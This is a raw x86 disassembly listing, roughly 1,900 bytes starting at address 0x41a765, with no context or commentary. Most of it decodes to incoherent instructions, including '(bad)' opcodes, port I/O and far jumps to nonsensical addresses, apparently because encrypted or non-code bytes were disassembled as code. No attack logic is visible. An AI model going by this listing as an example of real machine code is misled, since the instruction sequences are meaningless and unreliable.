  41a765:	sub    esp,DWORD PTR ds:0x5b89708c
  41a76b:	push   esp
  41a76c:	mov    BYTE PTR [eax-0xf76ead7],al
  41a772:	sbb    al,0x26
  41a774:	rcr    BYTE PTR ds:0x2db31856,cl
  41a77a:	cli    
  41a77b:	add    DWORD PTR [eax-0x1cd05d4c],esi
  41a781:	aam    0x2a
  41a783:	adc    bh,BYTE PTR [ebx]
  41a785:	das    
  41a786:	popf   
  41a787:	cdq    
  41a788:	and    esi,DWORD PTR [esi+edi*8+0x6983fe17]
  41a78f:	int    0x86
  41a791:	fstp   DWORD PTR [ebx]
  41a793:	add    al,0x3c
  41a795:	mov    ah,0x68
  41a797:	jmp    0xfb862f8a
  41a79c:	mov    bl,0x2e
  41a79e:	ja     0x41a78c
  41a7a0:	mov    esp,0xe6672099
  41a7a5:	jb     0x41a776
  41a7a7:	adc    bl,al
  41a7a9:	fwait
  41a7aa:	sbb    DWORD PTR [esi+0x50],esi
  41a7ad:	sbb    al,0xfa
  41a7af:	jnp    0x41a78d
  41a7b1:	mov    WORD PTR [edi+esi*2],fs
  41a7b4:	dec    esp
  41a7b5:	dec    ebx
  41a7b6:	push   ds
  41a7b7:	cmc    
  41a7b8:	sbb    ebx,eax
  41a7ba:	dec    esi
  41a7bb:	mov    ah,0x6d
  41a7bd:	xchg   ebp,eax
  41a7be:	sbb    eax,0x6086223
  41a7c3:	jne    0x41a781
  41a7c5:	xor    DWORD PTR [ebx],edx
  41a7c7:	sbb    BYTE PTR [ecx-0x4e],dh
  41a7ca:	mov    esi,0x3168069f
  41a7cf:	dec    ebx
  41a7d0:	stos   DWORD PTR es:[edi],eax
  41a7d1:	cmp    al,0x71
  41a7d3:	dec    ebp
  41a7d4:	push   esi
  41a7d5:	push   0xa82e5a98
  41a7da:	push   ecx
  41a7db:	xchg   esi,eax
  41a7dc:	inc    edx
  41a7dd:	js     0x41a84e
  41a7df:	mov    ds,WORD PTR [edi]
  41a7e1:	jbe    0x41a82a
  41a7e3:	out    dx,eax
  41a7e4:	xor    DWORD PTR [ebx-0x2],0xc2d88d16
  41a7eb:	rcl    ah,1
  41a7ed:	test   BYTE PTR [ebp+0x48a884a0],ah
  41a7f3:	mov    ds:0x6d01ffe9,al
  41a7f8:	mov    BYTE PTR [edx+0x2d0edbe5],al
  41a7fe:	aad    0xd9
  41a800:	mov    dh,0x37
  41a802:	ins    DWORD PTR es:[edi],dx
  41a803:	push   ebx
  41a804:	add    esi,DWORD PTR [esi+0x72]
  41a807:	jae    0x41a7c7
  41a809:	pushf  
  41a80a:	scas   al,BYTE PTR es:[edi]
  41a80b:	in     ax,0xed
  41a80e:	xlat   BYTE PTR ds:[ebx]
  41a80f:	push   ebx
  41a810:	lods   eax,DWORD PTR ds:[esi]
  41a811:	outs   dx,DWORD PTR ds:[esi]
  41a812:	mov    esi,0xc7d274c6
  41a817:	lods   al,BYTE PTR ds:[esi]
  41a818:	ret    0x9418
  41a81b:	jle    0x41a7be
  41a81d:	and    eax,DWORD PTR [edx]
  41a81f:	cmp    WORD PTR fs:[esi+0x61],0xf872
  41a826:	out    0xb6,al
  41a828:	in     al,0x1e
  41a82a:	ficomp DWORD PTR [ecx]
  41a82c:	xor    al,0x81
  41a82e:	mov    esp,0x39917b58
  41a833:	mov    eax,ds:0xfc76b270
  41a838:	push   edi
  41a839:	jp     0x41a84e
  41a83b:	mov    dh,0x28
  41a83d:	pop    ds
  41a83e:	push   ds
  41a83f:	pop    ds
  41a840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a841:	loop   0x41a7df
  41a843:	shr    DWORD PTR [ebx+0x669fa8bd],0x52
  41a84a:	mul    DWORD PTR ds:0xf111b90f
  41a850:	dec    esp
  41a851:	es push ebx
  41a853:	adc    edi,ecx
  41a855:	stos   DWORD PTR es:[edi],eax
  41a856:	ins    BYTE PTR es:[edi],dx
  41a857:	push   ecx
  41a858:	in     eax,0x26
  41a85a:	dec    ebx
  41a85b:	pop    edi
  41a85c:	mov    ds:0x171ecbd5,eax
  41a861:	or     bh,BYTE PTR [ecx+0xb026913]
  41a867:	xor    eax,0xdb7c41e9
  41a86c:	fdiv   QWORD PTR [esp+esi*4-0x70]
  41a870:	daa    
  41a871:	add    DWORD PTR ds:0xd88ddba4,edi
  41a877:	mov    al,0xbd
  41a879:	stos   BYTE PTR es:[edi],al
  41a87a:	mov    ecx,0x28e9f0c5
  41a87f:	adc    al,0x62
  41a881:	lods   eax,DWORD PTR ds:[esi]
  41a882:	or     DWORD PTR [esi-0x7e],edi
  41a885:	lds    edx,FWORD PTR [ebp-0x24cf206d]
  41a88b:	push   eax
  41a88c:	test   ebx,edx
  41a88e:	mov    ds:0xe725f122,al
  41a893:	lods   al,BYTE PTR ds:[esi]
  41a894:	rcr    BYTE PTR [ecx-0x43],0x2c
  41a898:	stc    
  41a899:	adc    ebp,DWORD PTR [ecx-0x796bbb8d]
  41a89f:	aam    0x50
  41a8a1:	sti    
  41a8a2:	sbb    edx,DWORD PTR [ecx+0x1e4a86e6]
  41a8a8:	jmp    0x9a638f5a
  41a8ad:	into   
  41a8ae:	lods   eax,DWORD PTR ds:[esi]
  41a8af:	mov    esi,0x55933eca
  41a8b4:	aad    0x8
  41a8b6:	pusha  
  41a8b7:	pop    ecx
  41a8b8:	cwde   
  41a8b9:	or     al,0x16
  41a8bb:	mov    bh,0x48
  41a8bd:	xchg   esp,eax
  41a8be:	inc    eax
  41a8bf:	sub    BYTE PTR [edx+eiz*1+0x3fcbe215],bl
  41a8c6:	outs   dx,BYTE PTR ds:[esi]
  41a8c7:	sub    DWORD PTR [ecx-0x2705d711],esp
  41a8cd:	imul   esi,DWORD PTR [eax-0x10e9f735],0xffffffae
  41a8d4:	sbb    dh,BYTE PTR [ebp-0x5bd3142f]
  41a8da:	jo     0x41a93a
  41a8dc:	and    esi,DWORD PTR [edx]
  41a8de:	rcr    DWORD PTR [edx],0x83
  41a8e1:	adc    DWORD PTR [esi],ebp
  41a8e3:	mov    dl,0x5c
  41a8e5:	xchg   edi,eax
  41a8e6:	aaa    
  41a8e7:	add    bl,dh
  41a8e9:	jge    0x41a8b2
  41a8eb:	jb     0x41a89a
  41a8ed:	xlat   BYTE PTR ds:[ebx]
  41a8ee:	mov    bl,0x86
  41a8f0:	mov    esi,0xa98d9a75
  41a8f5:	pop    ds
  41a8f6:	xlat   BYTE PTR ds:[ebx]
  41a8f7:	or     BYTE PTR [edi+0x1959c94e],dl
  41a8fd:	das    
  41a8fe:	and    al,0x48
  41a900:	sbb    al,0x37
  41a902:	sbb    edi,DWORD PTR [esi+0x6e269889]
  41a908:	inc    edi
  41a909:	je     0x41a931
  41a90b:	int    0x86
  41a90d:	pop    ebp
  41a90e:	push   cs
  41a90f:	or     eax,0x66ff0c6f
  41a914:	sub    eax,0x4b7fd0b
  41a919:	inc    esi
  41a91a:	inc    esi
  41a91b:	push   0xb703fd4f
  41a920:	neg    BYTE PTR [ebx+0x1e88db4f]
  41a926:	or     ebx,ecx
  41a928:	jle    0x41a910
  41a92a:	repz (bad) 
  41a92c:	loopne 0x41a98b
  41a92e:	mov    ebx,0xec91d7df
  41a933:	push   esp
  41a934:	cmp    BYTE PTR [ecx+eiz*8],dl
  41a937:	hlt    
  41a938:	cli    
  41a939:	inc    ebp
  41a93a:	outs   dx,BYTE PTR ds:[esi]
  41a93b:	rcr    BYTE PTR [ebp+0x44],1
  41a93e:	add    dl,bh
  41a940:	cli    
  41a941:	inc    esi
  41a942:	jae    0x41a918
  41a944:	mov    ds:0x2577e747,eax
  41a949:	cmp    BYTE PTR [edx+esi*2+0x32],cl
  41a94d:	push   0xc0bbc608
  41a952:	inc    esp
  41a953:	jmp    0x803acd44
  41a958:	(bad)  
  41a959:	rcl    ah,1
  41a95b:	cmp    ebx,DWORD PTR [edx+0x71]
  41a95e:	push   ds
  41a95f:	pop    ecx
  41a960:	cmp    dh,BYTE PTR [edx+edx*4]
  41a963:	arpl   WORD PTR [ebp+0x61],bp
  41a966:	fdivr  st(2),st
  41a968:	xor    al,0x8c
  41a96a:	je     0x41a962
  41a96c:	rol    DWORD PTR [esi],cl
  41a96e:	arpl   WORD PTR [esi-0x14],di
  41a971:	pop    esp
  41a972:	or     ecx,DWORD PTR [edx-0x57]
  41a975:	dec    ebx
  41a976:	(bad)  
  41a977:	pop    ebp
  41a978:	into   
  41a979:	sub    dl,dl
  41a97b:	jmp    0x41a94d
  41a97d:	imul   eax,DWORD PTR [ebp-0x7d2d1c94],0x2917dd5
  41a987:	aad    0x3c
  41a989:	hlt    
  41a98a:	xchg   edi,eax
  41a98b:	ficomp DWORD PTR [ebx]
  41a98d:	inc    ebx
  41a98e:	jp     0x41a950
  41a990:	push   edx
  41a991:	cmp    BYTE PTR [esi],ah
  41a993:	xchg   edx,eax
  41a994:	lahf   
  41a995:	arpl   WORD PTR [ecx],cx
  41a997:	les    esp,FWORD PTR ds:0x2cb54034
  41a99d:	shl    BYTE PTR [ecx-0x5361f78f],cl
  41a9a3:	sbb    esp,eax
  41a9a5:	jecxz  0x41a933
  41a9a7:	dec    ecx
  41a9a8:	add    ebx,esp
  41a9aa:	xlat   BYTE PTR ds:[ebx]
  41a9ab:	dec    esp
  41a9ac:	sbb    BYTE PTR [edi+0x7ba8892b],cl
  41a9b2:	mov    WORD PTR [ebp-0x19],es
  41a9b5:	xor    eax,0x3ab9a1ca
  41a9ba:	jnp    0x41aa1f
  41a9bc:	jecxz  0x41a94a
  41a9be:	dec    edx
  41a9bf:	lahf   
  41a9c0:	inc    eax
  41a9c1:	imul   edi,DWORD PTR [esi],0x9c612e2e
  41a9c7:	mov    dl,0xa2
  41a9c9:	add    DWORD PTR [edx-0x3be32cb1],ebx
  41a9cf:	adc    BYTE PTR [eax-0x13],dh
  41a9d2:	push   edi
  41a9d3:	fisttp DWORD PTR [edi-0x25da2a0]
  41a9d9:	xchg   esi,eax
  41a9da:	ja     0x41a9d6
  41a9dc:	(bad)  
  41a9dd:	ja     0x41a99f
  41a9df:	sbb    al,BYTE PTR [edi]
  41a9e1:	fldcw  WORD PTR [edx]
  41a9e3:	push   ebx
  41a9e4:	bound  esi,QWORD PTR [edi+0x68]
  41a9e7:	jl     0x41a975
  41a9e9:	data16 add BYTE PTR [eax-0x46dee9a4],0x40
  41a9f1:	in     eax,dx
  41a9f2:	jb     0x41aa3e
  41a9f4:	ficomp WORD PTR [edi+eiz*4]
  41a9f7:	jne    0x41a992
  41a9f9:	dec    edx
  41a9fa:	jl     0x41a9e3
  41a9fc:	xchg   BYTE PTR [ebx],ch
  41a9fe:	clc    
  41a9ff:	mov    dh,0xfd
  41aa01:	cmc    
  41aa02:	sub    DWORD PTR [esi+0x6c],eax
  41aa05:	in     al,0xf3
  41aa07:	sbb    ax,0x7c80
  41aa0b:	jns    0x41aa11
  41aa0d:	out    dx,eax
  41aa0e:	out    dx,eax
  41aa0f:	or     esi,DWORD PTR [edx+0x212fa785]
  41aa15:	cmp    al,bl
  41aa17:	nop
  41aa18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa19:	pop    edi
  41aa1a:	and    ah,dl
  41aa1c:	jns    0x41a9b5
  41aa1e:	repnz or ebp,DWORD PTR [eax+0x3d]
  41aa22:	dec    esp
  41aa23:	retf   
  41aa24:	nop
  41aa25:	aas    
  41aa26:	stc    
  41aa27:	out    0xe1,eax
  41aa29:	mov    esi,0xff5d8a30
  41aa2e:	cld    
  41aa2f:	mov    ebx,DWORD PTR [ebx-0x3e]
  41aa32:	pop    esp
  41aa33:	outs   dx,BYTE PTR ds:[esi]
  41aa34:	bnd jl 0x41a9df
  41aa37:	fsubrp st(3),st
  41aa39:	outs   dx,DWORD PTR ds:[esi]
  41aa3a:	mov    ds:0x7d32f8c,eax
  41aa3f:	sbb    dh,BYTE PTR [edx+ebx*4+0x51f5fa2]
  41aa46:	pushf  
  41aa47:	imul   ebx,DWORD PTR [edi],0xceca21c1
  41aa4d:	mov    al,0x46
  41aa4f:	sub    bh,BYTE PTR [edi+0x43]
  41aa52:	mov    esp,0xea6627a1
  41aa57:	cmp    BYTE PTR [edi+0x5],ah
  41aa5a:	mov    al,ds:0xa89a226b
  41aa5f:	lea    ecx,[bx+di-0x7c]
  41aa63:	dec    eax
  41aa64:	sahf   
  41aa65:	lds    ebp,FWORD PTR [eax]
  41aa67:	or     al,0x55
  41aa69:	push   ebx
  41aa6a:	inc    esi
  41aa6b:	repz or ch,BYTE PTR [edx+esi*4]
  41aa6f:	and    ecx,DWORD PTR [ecx]
  41aa71:	loope  0x41aae3
  41aa73:	pushf  
  41aa74:	or     DWORD PTR [edx+0x28],esi
  41aa77:	push   ds
  41aa78:	fimul  DWORD PTR [ebx+esi*1]
  41aa7b:	dec    esi
  41aa7c:	jmp    0x322a:0x3fd76810
  41aa83:	cmp    eax,0x6677cb8b
  41aa88:	test   bh,bh
  41aa8a:	cmp    al,0xfe
  41aa8c:	push   edx
  41aa8d:	mov    ebp,0x9dea3162
  41aa92:	(bad)  
  41aa93:	or     al,0xcb
  41aa95:	push   eax
  41aa96:	adc    DWORD PTR ds:0x8a576b38,edi
  41aa9c:	and    ecx,DWORD PTR [edx-0x5557422e]
  41aaa2:	push   0xffffffa2
  41aaa4:	clc    
  41aaa5:	xchg   edx,eax
  41aaa6:	or     eax,0xac26cafc
  41aaab:	fnstcw WORD PTR [eax-0x6996f22c]
  41aab1:	jns    0x41aab1
  41aab3:	ins    DWORD PTR es:[edi],dx
  41aab4:	sub    al,bh
  41aab6:	cmp    bl,ch
  41aab8:	lock mov ds:0x20142deb,al
  41aabe:	adc    eax,0xeefc8823
  41aac3:	add    cl,dh
  41aac5:	ja     0x41ab07
  41aac7:	jbe    0x41ab2e
  41aac9:	sub    cl,bl
  41aacb:	add    ch,BYTE PTR [ebp-0xb57d7a2]
  41aad1:	in     al,dx
  41aad2:	mov    ebx,0x280476b
  41aad7:	in     al,0xfb
  41aad9:	push   ebp
  41aada:	mov    esi,0xbfba33f5
  41aadf:	ss jbe 0x41ab3b
  41aae2:	sub    eax,0x24846b32
  41aae7:	fsub   DWORD PTR [eax]
  41aae9:	bound  ebx,QWORD PTR [eax+0x2f]
  41aaec:	and    al,0x73
  41aaee:	sti    
  41aaef:	mov    ecx,0x1f7ee0ce
  41aaf4:	xchg   edx,eax
  41aaf5:	out    0x56,al
  41aaf7:	dec    edx
  41aaf8:	mov    edx,0xfc547591
  41aafd:	mov    esi,0x3f37c985
  41ab02:	xor    bl,BYTE PTR [edx-0x668952ae]
  41ab08:	addr16 or eax,0xa0fc0ee6
  41ab0e:	mov    eax,0xab34c0cd
  41ab13:	or     edi,ebx
  41ab15:	mov    edi,ebp
  41ab17:	popf   
  41ab18:	push   ecx
  41ab19:	push   DWORD PTR [esi]
  41ab1b:	xlat   BYTE PTR ds:[ebx]
  41ab1c:	aas    
  41ab1d:	xchg   DWORD PTR [ebp-0x6bf9cbb1],esi
  41ab23:	mov    edi,DWORD PTR [esi]
  41ab25:	mov    ecx,0xdbc64430
  41ab2a:	pop    ss
  41ab2b:	lds    ebp,FWORD PTR [edx-0x7c]
  41ab2e:	pop    ebp
  41ab2f:	bsr    ebx,DWORD PTR [ecx+0x69d53c3a]
  41ab36:	ins    BYTE PTR es:[edi],dx
  41ab37:	aam    0xfb
  41ab39:	jbe    0x41ab19
  41ab3b:	xor    BYTE PTR [edi+0x58e8bf43],al
  41ab41:	mov    WORD PTR [di-0x23],fs
  41ab45:	das    
  41ab46:	ds inc ebp
  41ab48:	jo     0x41ab54
  41ab4a:	inc    ebx
  41ab4b:	mov    ds:0xe3fcc44f,eax
  41ab50:	clc    
  41ab51:	es out 0x7b,al
  41ab54:	dec    ch
  41ab56:	imul   ebx,eax,0x6e6a6fd4
  41ab5c:	sar    eax,1
  41ab5e:	inc    esi
  41ab5f:	xchg   ah,dh
  41ab61:	jge    0x41ab93
  41ab63:	iret   
  41ab64:	js     0x41aae6
  41ab66:	nop    DWORD PTR [ecx]
  41ab69:	mov    ch,0xec
  41ab6b:	add    DWORD PTR [ecx+0x4b0feb99],0x58
  41ab72:	xlat   BYTE PTR ds:[bx]
  41ab74:	adc    al,0xf5
  41ab76:	xchg   ecx,eax
  41ab77:	sub    al,0xf
  41ab79:	mov    ds,WORD PTR [ecx]
  41ab7b:	int    0xec
  41ab7d:	(bad)  
  41ab7e:	lock push esi
  41ab80:	stos   BYTE PTR es:[edi],al
  41ab81:	(bad)  
  41ab82:	(bad)  
  41ab83:	or     ebx,DWORD PTR gs:[ebx+0x32300847]
  41ab8a:	cwde   
  41ab8b:	add    cl,BYTE PTR [eax-0x45]
  41ab8e:	shr    ch,cl
  41ab90:	jnp    0x41ab60
  41ab92:	scas   eax,DWORD PTR es:[edi]
  41ab93:	xchg   esi,eax
  41ab94:	dec    edi
  41ab95:	es out dx,eax
  41ab97:	pop    edi
  41ab98:	mov    DWORD PTR [esi],eax
  41ab9a:	pop    es
  41ab9b:	sbb    eax,0x242965f3
  41aba0:	cmp    bh,dl
  41aba2:	sbb    al,0x38
  41aba4:	cmc    
  41aba5:	test   al,0x5d
  41aba7:	sbb    ebp,ebx
  41aba9:	or     esi,edx
  41abab:	mov    ecx,0x6ca11353
  41abb0:	nop
  41abb1:	mov    cl,0x3e
  41abb3:	fisub  WORD PTR [esi]
  41abb5:	rcl    ch,cl
  41abb7:	xchg   ebp,eax
  41abb8:	cmp    al,BYTE PTR [eax+0x33]
  41abbb:	pop    esp
  41abbc:	int    0x7a
  41abbe:	ret    0xa637
  41abc1:	xchg   ebx,eax
  41abc2:	xchg   DWORD PTR [esi],ecx
  41abc4:	and    eax,0x80e80703
  41abc9:	mov    eax,ds:0xc5b5e91a
  41abce:	sub    ah,BYTE PTR [edi+0x57]
  41abd1:	lods   al,BYTE PTR ds:[esi]
  41abd2:	xor    eax,0xb52d2a62
  41abd7:	cwde   
  41abd8:	loop   0x41abf3
  41abda:	out    0xc2,eax
  41abdc:	dec    eax
  41abdd:	dec    edi
  41abde:	mov    ecx,0x1f4c811d
  41abe3:	mov    bl,0xd8
  41abe5:	mov    al,ds:0x50a9295d
  41abea:	in     al,0x60
  41abec:	into   
  41abed:	add    esi,edi
  41abef:	cmp    bh,dh
  41abf1:	outs   dx,DWORD PTR ds:[esi]
  41abf2:	push   0x8ea4eb8c
  41abf7:	loopne 0x41abb1
  41abf9:	sub    al,al
  41abfb:	test   al,0xd4
  41abfd:	aas    
  41abfe:	dec    eax
  41abff:	and    BYTE PTR [edi+edi*4+0x27],bh
  41ac03:	iret   
  41ac04:	xor    cl,BYTE PTR [edx]
  41ac06:	outs   dx,DWORD PTR ds:[esi]
  41ac07:	js     0x41ab9e
  41ac09:	(bad)  
  41ac0a:	mov    ebp,0xfca5e50
  41ac0f:	push   0xd7883547
  41ac14:	cmp    esp,DWORD PTR [edi]
  41ac16:	jbe    0x41ac06
  41ac18:	inc    eax
  41ac19:	cdq    
  41ac1a:	out    dx,al
  41ac1b:	add    eax,0x750a885d
  41ac20:	enter  0x62c9,0x58
  41ac24:	aam    0x39
  41ac26:	in     al,dx
  41ac27:	sahf   
  41ac28:	mov    esi,0x392cb054
  41ac2d:	push   ecx
  41ac2e:	je     0x41ac0e
  41ac30:	gs push edx
  41ac32:	outs   dx,BYTE PTR ds:[esi]
  41ac33:	and    eax,0x8da5062a
  41ac38:	cmp    eax,0xa12be27b
  41ac3d:	adc    eax,0x9c3fb22c
  41ac42:	and    al,dh
  41ac44:	(bad)  
  41ac45:	mov    ebp,0xc00eefb8
  41ac4a:	addr16 xor eax,0x40c23431
  41ac50:	mov    dl,0xfe
  41ac52:	mov    ch,0x38
  41ac54:	push   ss
  41ac55:	push   0x7b493c8b
  41ac5a:	fbstp  TBYTE PTR [eax+0xc]
  41ac5d:	adc    ah,BYTE PTR [ebx-0x19a64de0]
  41ac63:	shl    dl,1
  41ac65:	add    eax,0xbea3eefd
  41ac6a:	es call 0xc8347f8e
  41ac70:	adc    DWORD PTR [edi],edi
  41ac72:	add    BYTE PTR [ecx-0x1e],cl
  41ac75:	inc    ebx
  41ac76:	or     eax,0x28906c20
  41ac7b:	pop    ebp
  41ac7c:	mov    bh,0x84
  41ac7e:	pop    ecx
  41ac7f:	test   eax,0xc2e9abbd
  41ac84:	dec    edx
  41ac85:	icebp  
  41ac86:	mov    cl,0xa2
  41ac88:	xor    esi,edi
  41ac8a:	ud0    edi,DWORD PTR [esi-0x56]
  41ac8e:	subps  xmm5,XMMWORD PTR [ecx+eiz*4]
  41ac92:	pop    edi
  41ac93:	retf   
  41ac94:	scas   al,BYTE PTR es:[edi]
  41ac95:	aad    0x71
  41ac97:	(bad)  
  41ac98:	loope  0x41ac61
  41ac9a:	and    BYTE PTR [ebp-0x7675918c],cl
  41aca0:	pop    ds
  41aca1:	or     eax,0x4b1aa9ad
  41aca6:	sbb    ebp,DWORD PTR [esi-0x20]
  41aca9:	(bad)  
  41acaa:	ins    BYTE PTR es:[edi],dx
  41acab:	test   eax,0xf9c0419b
  41acb0:	mov    esp,0xcff21b5d
  41acb5:	(bad)  
  41acb6:	lahf   
  41acb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acb8:	inc    ebx
  41acb9:	enter  0x21e9,0x31
  41acbd:	inc    edx
  41acbe:	jmp    0xce18:0x78b61267
  41acc5:	pop    ecx
  41acc6:	dec    BYTE PTR [edi+0x3c99a78]
  41accc:	jb     0x41aca9
  41acce:	add    eax,0x2ffc832b
  41acd3:	inc    ecx
  41acd4:	mov    bh,0xec
  41acd6:	add    BYTE PTR [ebp+0x23],ch
  41acd9:	adc    dh,BYTE PTR [ecx]
  41acdb:	pop    edi
  41acdc:	test   eax,0x7aaccc5b
  41ace1:	jmp    0x41ac73
  41ace3:	pop    ebx
  41ace4:	pop    edi
  41ace5:	test   eax,0x1f1112c0
  41acea:	repz sbb ebx,DWORD PTR [eax]
  41aced:	and    al,cl
  41acef:	and    al,BYTE PTR [eax+0x7e]
  41acf2:	je     0x41acea
  41acf4:	xor    al,0xee
  41acf6:	or     DWORD PTR [ebx+esi*1+0x5e],0x5beeea42
  41acfe:	xchg   ebx,eax
  41acff:	neg    DWORD PTR [edi+0x594a1903]
  41ad05:	xchg   ebx,eax
  41ad06:	out    0x95,al
  41ad08:	repnz xchg esp,eax
  41ad0a:	push   0x2a
  41ad0c:	xor    BYTE PTR [esi],bh
  41ad0e:	in     eax,dx
  41ad0f:	push   0xf7c2fabc
  41ad14:	sub    eax,0x24e84bc5
  41ad19:	bound  edx,QWORD PTR ds:0x8d29cb3a
  41ad1f:	js     0x41acc9
  41ad21:	xor    DWORD PTR ds:[ebp-0x2aa89a3f],eax
  41ad28:	pcmpeqw mm5,QWORD PTR [ebx]
  41ad2b:	mov    dl,0x14
  41ad2d:	cdq    
  41ad2e:	pop    esi
  41ad2f:	and    DWORD PTR [eax],edi
  41ad31:	icebp  
  41ad32:	jno    0x41ad32
  41ad34:	ja     0x41ad42
  41ad36:	adc    BYTE PTR [edi-0x4e],al
  41ad39:	add    esp,DWORD PTR [eax]
  41ad3b:	and    cl,bl
  41ad3d:	lahf   
  41ad3e:	dec    edx
  41ad3f:	mov    al,0xcb
  41ad41:	sub    al,0x98
  41ad43:	sub    edx,DWORD PTR gs:[ecx+0x4ebaf227]
  41ad4a:	fidivr DWORD PTR [edx+edi*2-0x3]
  41ad4e:	retf   
  41ad4f:	inc    esp
  41ad50:	cwde   
  41ad51:	and    edi,DWORD PTR [edx+0x21]
  41ad54:	lods   al,BYTE PTR ds:[esi]
  41ad55:	jge    0x41ad81
  41ad57:	jnp    0x41ad91
  41ad59:	nop
  41ad5a:	sbb    ch,BYTE PTR [edi]
  41ad5c:	js     0x41ad63
  41ad5e:	ret    0xb9f6
  41ad61:	test   BYTE PTR [ebx+0x7e],bl
  41ad64:	mov    esi,0xf5588bdd
  41ad69:	add    BYTE PTR [ecx+0x2ba2bb7f],bl
  41ad6f:	xchg   bh,bh
  41ad71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad72:	adc    bh,BYTE PTR [edx+eax*4-0x3ff6f5a7]
  41ad79:	loope  0x41ada0
  41ad7b:	pop    eax
  41ad7c:	ret    
  41ad7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad7e:	in     al,dx
  41ad7f:	out    dx,eax
  41ad80:	or     al,0x20
  41ad82:	pop    ebx
  41ad83:	leave  
  41ad84:	in     al,0x2a
  41ad86:	(bad)
  41ad89:	hlt    
  41ad8a:	mov    ds:0xe7e976db,al
  41ad8f:	mov    dh,0xd2
  41ad91:	fisub  WORD PTR [eax]
  41ad93:	or     al,0xda
  41ad95:	push   ecx
  41ad96:	leave  
  41ad97:	stos   DWORD PTR es:[edi],eax
  41ad98:	inc    esp
  41ad99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad9a:	div    DWORD PTR [esi+eax*1+0x61]
  41ad9e:	aam    0x20
  41ada0:	mov    BYTE PTR ds:0x8665d5da,0x9
  41ada7:	mov    ah,0x36
  41ada9:	jmp    0xb3a2:0x28134d4c
  41adb0:	test   eax,0xf1417dad
  41adb5:	push   ds
  41adb6:	push   ebp
  41adb7:	outs   dx,BYTE PTR ds:[esi]
  41adb8:	cli    
  41adb9:	cmp    al,0x35
  41adbb:	dec    ecx
  41adbc:	in     eax,dx
  41adbd:	cmc    
  41adbe:	(bad)  
  41adbf:	sub    eax,0x2d811c85
  41adc4:	cwde   
  41adc5:	add    bh,BYTE PTR ds:0x4fee5747
  41adcb:	ja     0x41ad72
  41adcd:	sub    cl,ch
  41adcf:	lods   eax,DWORD PTR ds:[esi]
  41add0:	xor    BYTE PTR [edi+0x42bb9b7b],dh
  41add6:	sti    
  41add7:	jge    0x41ae17
  41add9:	or     DWORD PTR [ebx],ecx
  41addb:	mov    WORD PTR [ebx-0x1c],es
  41adde:	and    DWORD PTR [edx+edx*4-0x41],0x41871fc7
  41ade6:	jg     0x41adde
  41ade8:	add    al,0xf7
  41adea:	call   0x2f82:0xe8572527
  41adf1:	imul   edx,DWORD PTR [ecx],0xb
  41adf4:	enter  0x7fc2,0x13
  41adf8:	pop    esp
  41adf9:	jge    0x41ada9
  41adfb:	dec    edx
  41adfc:	mov    al,ds:0xe1ed57d7
  41ae01:	std    
  41ae02:	pop    esi
  41ae03:	iret   
  41ae04:	aaa    
  41ae05:	add    ch,BYTE PTR [edx+0x6c]
  41ae08:	mov    ebx,0x36293d15
  41ae0d:	test   DWORD PTR ds:0x373a797f,esp
  41ae13:	mov    edx,DWORD PTR [edi]
  41ae15:	(bad)  
  41ae16:	(bad)  
  41ae18:	outs   dx,BYTE PTR ds:[esi]
  41ae19:	cmc    
  41ae1a:	stos   DWORD PTR es:[edi],eax
  41ae1b:	or     eax,0x45240b22
  41ae20:	dec    edi
  41ae21:	xchg   ebx,eax
  41ae22:	sahf   
  41ae23:	jl     0x41ae51
  41ae25:	lock inc esi
  41ae27:	jg     0x41ae03
  41ae29:	or     eax,0x592ac9a3
  41ae2e:	into   
  41ae2f:	adc    ecx,esi
  41ae31:	test   BYTE PTR [ebx+0x6a9879c5],cl
  41ae37:	mov    eax,ds:0xccf53727
  41ae3c:	arpl   WORD PTR [ebx+0xa],cx
  41ae3f:	add    ch,bl
  41ae41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae42:	and    eax,DWORD PTR [eax+ebp*4-0x5a7eeb8a]
  41ae49:	haddpd xmm2,XMMWORD PTR [edx+0x6d558b0f]
  41ae51:	scas   eax,DWORD PTR es:[edi]
  41ae52:	xor    DWORD PTR [ebx+0x31],esp
  41ae55:	and    ch,BYTE PTR [ebp-0x61]
  41ae58:	int3   
  41ae59:	adc    al,0x1e
  41ae5b:	sub    eax,0x33a2bd14
  41ae60:	test   al,0x8c
  41ae62:	jl     0x41aed9
  41ae64:	mov    al,0x78
  41ae66:	cmc    
  41ae67:	in     al,0x57
  41ae69:	xor    BYTE PTR [ecx+0x353f551f],bh
  41ae6f:	sbb    eax,0x2e17b59b
  41ae74:	jl     0x41aeb9
  41ae76:	mov    ebp,0x7529de5f
  41ae7b:	cmp    eax,edi
  41ae7d:	jg     0x41aeb4
  41ae7f:	dec    dh
  41ae81:	das    
  41ae82:	mov    eax,ds:0xfcf44876
  41ae87:	push   cs
  41ae88:	pop    es
  41ae89:	mov    ebp,0x14daf41c
  41ae8e:	pop    ss
  41ae8f:	push   ecx
  41ae90:	or     al,0x6
  41ae92:	popa   
  41ae93:	lods   al,BYTE PTR ds:[esi]
  41ae94:	outs   dx,BYTE PTR ds:[esi]
  41ae95:	pop    eax
  41ae96:	ret    
  41ae97:	jp     0x41af14
  41ae99:	push   0x2
  41ae9b:	push   edi
  41ae9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae9e:	aaa    
  41ae9f:	jecxz  0x41ae77
  41aea1:	in     al,0x3f
  41aea3:	into   
  41aea4:	or     DWORD PTR [edx],edi
  41aea6:	mov    cl,0xc5
  41aea8:	mov    dl,0x2
  41aeaa:	in     al,dx
  41aeab:	bound  ebx,QWORD PTR [esi-0x74f140f2]
  41aeb1:	push   ebp
  41aeb2:	or     BYTE PTR [ecx],ch
  41aeb4:	adc    eax,0x42a292
  41aeb9:	mov    ebx,DWORD PTR [ebp-0x58]
  41aebc:	sub    DWORD PTR ds:0x42a2c2,0x2e82
  41aec6:	add    edx,0x5708fa
  41aecc:	imul   edx,ebx
  41aecf:	sbb    ebx,0x1e47
  41aed5:	mov    DWORD PTR [ebp-0x58],edx
